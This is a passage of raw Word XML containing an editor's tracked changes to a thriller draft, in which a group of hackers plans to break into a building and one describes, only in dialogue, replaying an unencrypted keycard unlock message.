          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Something</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> is in that freezer. Something valuable. I say we take it. We’re hackers, right? Let’s hack their theft and make it our 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Jason </w:t>
      </w:r>
      <w:ins w:id="941" w:author="TextVet" w:date="2016-03-16T15:54:00Z">
        <w:r w:rsidR="000772A1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>regarded</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="942" w:author="TextVet" w:date="2016-03-16T15:54:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000772A1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>looked at</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> him</w:t>
      </w:r>
      <w:ins w:id="943" w:author="TextVet" w:date="2016-03-16T15:54:00Z">
        <w:r w:rsidR="000772A1">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aghast. “Jesus. You’re serious. Danny, have you lost your mind? They’ll </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>kill you</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down, his brow furrowed</w:t>
      </w:r>
      <w:del w:id="944" w:author="TextVet" w:date="2016-03-16T15:54:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001447B7">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> in thought</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “Not necessarily. I think can out</w:t>
      </w:r>
      <w:del w:id="945" w:author="TextVet" w:date="2016-03-16T15:55:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B81A50">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maneuver them in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the financier asked. “</w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="946" w:author="TextVet" w:date="2016-03-16T15:55:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t xml:space="preserve">Look </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>at those guys! They’re not new at this. They have guns, training, experience</w:t>
      </w:r>
      <w:ins w:id="947" w:author="TextVet" w:date="2016-03-16T15:57:00Z">
        <w:r w:rsidR="00B158CB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>—</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="948" w:author="TextVet" w:date="2016-03-16T15:57:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B158CB">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t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="949" w:author="TextVet" w:date="2016-03-16T15:56:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>We’ve</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> got a massive tactical advantage</w:t>
      </w:r>
      <w:ins w:id="950" w:author="TextVet" w:date="2016-03-16T15:57:00Z">
        <w:r w:rsidR="001D228F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="951" w:author="TextVet" w:date="2016-03-16T15:57:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001D228F">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del w:id="952" w:author="TextVet" w:date="2016-03-16T15:57:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001D228F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">Danny </w:delText>
        </w:r>
      </w:del>
      <w:del w:id="953" w:author="TextVet" w:date="2016-03-16T15:56:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00547D98">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>sai</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="954" w:author="TextVet" w:date="2016-03-16T15:57:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001D228F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>d. He</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="955" w:author="TextVet" w:date="2016-03-16T15:57:00Z">
        <w:r w:rsidR="001D228F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Danny</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> tapped </w:t>
      </w:r>
      <w:del w:id="956" w:author="TextVet" w:date="2016-03-16T15:57:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D92190">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">on the screen of </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>his laptop</w:t>
      </w:r>
      <w:ins w:id="957" w:author="TextVet" w:date="2016-03-16T15:57:00Z">
        <w:r w:rsidR="00D92190">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> screen</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nodded</w:t>
      </w:r>
      <w:del w:id="958" w:author="TextVet" w:date="2016-03-16T15:56:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00EE51A0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> his big furry head</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “The cameras. You’re talking about going all Splinter Cell on them, right? Covert ops?”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“Right,” said Danny. “We can see everything in there. They can’t. And that information asymmetry means that </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>we</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> have the upper hand. At Claymore, I built Navy communication grids. Modern battlefields are digital. During both Iraq wars, what’s the first thing the US Army did? Knocked out the enemy computer networks. During the riots in Iran and Libya and Syria, the rulers disabled civilian access to cellphones. Information is what the military refers to as a ‘force multiplier’. Those guys in there have guns. But information? That’s </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>our</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> game.”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want in,” said Mike. He hopped out and went to stand by Danny. “I said at the beginning </w:t>
      </w:r>
      <w:del w:id="959" w:author="TextVet" w:date="2016-03-16T15:58:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00926ACF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">that </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">I’d be your muscle if things got physical. I keep my word.” Danny nodded </w:t>
      </w:r>
      <w:del w:id="960" w:author="TextVet" w:date="2016-03-16T15:59:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F73C21">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>in</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> grat</w:t>
      </w:r>
      <w:del w:id="961" w:author="TextVet" w:date="2016-03-16T15:59:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F73C21">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>itud</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:ins w:id="962" w:author="TextVet" w:date="2016-03-16T15:59:00Z">
        <w:r w:rsidR="00F73C21">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>fully</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ins w:id="963" w:author="TextVet" w:date="2016-03-16T15:59:00Z">
        <w:r w:rsidR="00134399">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Have</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="964" w:author="TextVet" w:date="2016-03-16T15:59:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00134399">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>Do</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> you </w:t>
      </w:r>
      <w:del w:id="965" w:author="TextVet" w:date="2016-03-16T15:59:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00134399">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>have</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="966" w:author="TextVet" w:date="2016-03-16T16:00:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00134399">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 plan, Danny?”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“Not yet,” he </w:t>
      </w:r>
      <w:ins w:id="967" w:author="TextVet" w:date="2016-03-16T16:00:00Z">
        <w:r w:rsidR="004E774C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>concede</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="968" w:author="TextVet" w:date="2016-03-16T16:00:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004E774C">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 “First, we need to find a way into the building…”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969" w:author="TextVet" w:date="2016-03-16T16:00:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00510ABE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">Mike said, </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>“I think I can arrange that</w:t>
      </w:r>
      <w:ins w:id="970" w:author="TextVet" w:date="2016-03-16T16:00:00Z">
        <w:r w:rsidR="00510ABE">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,” offered Mike.</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="971" w:author="TextVet" w:date="2016-03-16T16:00:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00510ABE">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972" w:author="TextVet" w:date="2016-03-16T16:00:00Z">
        <w:r w:rsidR="00510ABE">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Look at the outside camera. Zoom in on the keycard reader.”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pulled up the feed. As he watched, the green light popped on to indicate the door was unlocked. It stayed lit for several seconds.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simple replay attack,” Mike explained. “When that guy opened the door, the keycard reader sent a UDP packet to an authentication database, which replied with a datagram to unlock the door. I saw it on my packet sniff, and noticed that there’s no crypto handshake. I just sent the keycard reader a copy of the authorization message.”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you teach Moshen to do that?”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shrugged. “I can write a script for him to run. Should be pretty straightforward.”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“Great,” Danny said</w:t>
      </w:r>
      <w:ins w:id="973" w:author="TextVet" w:date="2016-03-16T16:01:00Z">
        <w:r w:rsidR="00A02E59">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del w:id="974" w:author="TextVet" w:date="2016-03-16T16:01:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A02E59">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">with </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>forc</w:t>
      </w:r>
      <w:ins w:id="975" w:author="TextVet" w:date="2016-03-16T16:02:00Z">
        <w:r w:rsidR="00A02E59">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="976" w:author="TextVet" w:date="2016-03-16T16:02:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A02E59">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confidence. “Now all we need is a way to get that guy away from the front door. Let me think…” He stood staring at the ground. His body remained frozen, but his eyes darted </w:t>
      </w:r>
      <w:del w:id="977" w:author="TextVet" w:date="2016-03-16T16:02:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00827085">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">rapidly </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">in spastic patterns. His fingers </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>twitched as though drawing diagrams in an ethereal notebook. After a minute of fidgety silence, he looked up</w:t>
      </w:r>
      <w:del w:id="978" w:author="TextVet" w:date="2016-03-16T16:03:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004020B9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> abruptly</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “Jason. You’re part of this little Dungeons and Dragons group. How are your role-playing abilities?”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“Uhh… pretty good, I guess…” Jason said apprehensively.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cleared his throat and interjected, “He’s being extremely humble.”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“Thanks, Mike…” Jason replied </w:t>
      </w:r>
      <w:del w:id="979" w:author="TextVet" w:date="2016-03-16T16:05:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00793433">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>with</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="980" w:author="TextVet" w:date="2016-03-16T16:05:00Z">
        <w:r w:rsidR="00793433">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>through</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a dubious smile. “When I was a young sales associate</w:t>
      </w:r>
      <w:ins w:id="981" w:author="TextVet" w:date="2016-03-16T16:03:00Z">
        <w:r w:rsidR="00B840D7">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I did a lot of improv theater. It helped me build cold-calling skills.”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“We’ll need your </w:t>
      </w:r>
      <w:ins w:id="982" w:author="TextVet" w:date="2016-03-16T16:05:00Z">
        <w:r w:rsidR="00A55C93">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>help</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="983" w:author="TextVet" w:date="2016-03-16T16:05:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A55C93">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>participation</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,” said Danny. “And your car. Do you have anything we can use as a weapon? A flare gun, maybe?”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“There’s a lug wrench in the trunk, under the spare tire,” Jason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turned to Mike. “You said you play hockey, right? Think you can handle beating someone with a stick?”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grinned.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said Danny. “Get out of the car. You’ll stay over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about you, Danny?”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“Me? I’ll be going in with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opened the passenger door and grabbed his Claymore tote bag. He began pulling out bits of metal and plastic, and clipping and twisting them together.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First came the narrow bullhorn-looking device, with its pistol-like handle. It was followed by a row of plastic blocks, each as big as a Rubik’s Cube. Next emerged a group of heavy blue cylinders, each one the size and shape of a beer can, arranged like an eight-pack. Each component was strung on cables, the junction points buried under slathers of caulk and epoxy.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two-foot-long white hollow plastic tube, about four inches wide with slots and grooves all along its length, </w:t>
      </w:r>
      <w:ins w:id="984" w:author="TextVet" w:date="2016-03-16T16:08:00Z">
        <w:r w:rsidR="00D84AA6">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>protruded</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="985" w:author="TextVet" w:date="2016-03-16T16:08:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D84AA6">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>stuck out</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> from </w:t>
      </w:r>
      <w:del w:id="986" w:author="TextVet" w:date="2016-03-16T16:08:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D84AA6">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">the top of </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
